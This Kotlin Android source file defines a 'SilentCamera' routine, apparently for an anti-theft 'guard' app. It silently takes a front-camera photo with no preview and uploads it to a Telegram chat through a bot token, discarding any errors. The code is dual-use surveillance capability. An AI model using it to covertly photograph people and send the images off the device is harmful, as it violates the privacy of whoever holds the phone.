package com.example.guard

import android.annotation.SuppressLint
import android.content.Context
import android.content.pm.PackageManager
import android.graphics.ImageFormat
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.media.Image
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import android.util.Size

object SilentCamera {

    @SuppressLint("MissingPermission")
    fun capture(context: Context, token: String, chat: String, name: String, label: String) {
        if (context.checkSelfPermission(android.Manifest.permission.CAMERA)
            != PackageManager.PERMISSION_GRANTED
        ) return

        val thread = HandlerThread("GuardCamera2")
        thread.start()
        val handler = Handler(thread.looper)

        handler.post {
            try {
                val manager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
                var camId: String? = null
                for (id in manager.cameraIdList) {
                    val chars = manager.getCameraCharacteristics(id)
                    if (chars.get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_FRONT) {
                        camId = id
                        break
                    }
                }
                if (camId == null) camId = manager.cameraIdList.firstOrNull()
                if (camId == null) { thread.quitSafely(); return@post }

                val chars = manager.getCameraCharacteristics(camId)
                val map = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
                val sizes = map?.getOutputSizes(ImageFormat.JPEG)
                val size = sizes?.minByOrNull { it.width * it.height } ?: Size(640, 480)

                val reader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 1)

                reader.setOnImageAvailableListener({ r ->
                    val image: Image? = try { r.acquireLatestImage() } catch (e: Exception) { null }
                    if (image != null) {
                        try {
                            val buffer = image.planes[0].buffer
                            val bytes = ByteArray(buffer.remaining())
                            buffer.get(bytes)
                            Telegram.sendPhoto(token, chat, "$name: $label", bytes)
                        } catch (e: Exception) {
                        } finally {
                            image.close()
                        }
                    }
                }, handler)

                manager.openCamera(camId, object : CameraDevice.StateCallback() {
                    override fun onOpened(device: CameraDevice) {
                        try {
                            val requestBuilder = device.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                            requestBuilder.addTarget(reader.surface)

                            device.createCaptureSession(
                                listOf(reader.surface),
                                object : CameraCaptureSession.StateCallback() {
                                    override fun onConfigured(session: CameraCaptureSession) {
                                        try {
                                            session.capture(requestBuilder.build(), null, handler)
                                        } catch (e: Exception) {
                                        }
                                        handler.postDelayed({
                                            try { session.close() } catch (e: Exception) {}
                                            try { device.close() } catch (e: Exception) {}
                                            try { reader.close() } catch (e: Exception) {}
                                            thread.quitSafely()
                                        }, 2000)
                                    }
                                    override fun onConfigureFailed(session: CameraCaptureSession) {
                                        try { device.close() } catch (e: Exception) {}
                                        try { reader.close() } catch (e: Exception) {}
                                        thread.quitSafely()
                                    }
                                },
                                handler
                            )
                        } catch (e: Exception) {
                            try { device.close() } catch (e2: Exception) {}
                            thread.quitSafely()
                        }
                    }

                    override fun onDisconnected(device: CameraDevice) {
                        try { device.close() } catch (e: Exception) {}
                        thread.quitSafely()
                    }

                    override fun onError(device: CameraDevice, error: Int) {
                        try { device.close() } catch (e: Exception) {}
                        thread.quitSafely()
                    }
                }, handler)

            } catch (e: Exception) {
                thread.quitSafely()
            }
        }
    }
}
